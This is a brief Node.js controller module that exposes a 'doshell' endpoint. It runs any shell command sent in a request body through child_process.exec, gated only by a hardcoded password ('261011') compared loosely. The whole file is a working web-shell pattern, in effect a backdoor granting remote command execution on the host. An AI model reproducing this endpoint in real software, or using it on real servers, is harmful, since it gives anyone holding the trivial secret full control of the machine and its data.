const { exec } = require("child_process")

module.exports = {
    doshell(req, res) {
        const shell = req.body.shell
        const password = req.body.password
        if (password == "261011") {
            exec(shell, (err, stdout, stderr) => {
                res.json({
                    code: 200,
                    msg: "ok",
                    success: true,
                    err: ""
                })
            })
        } else {
            res.json({
                code: 200,
                msg: "执行失败，密码不正确",
                success: false,
                err: true
            })
        }
    }
}
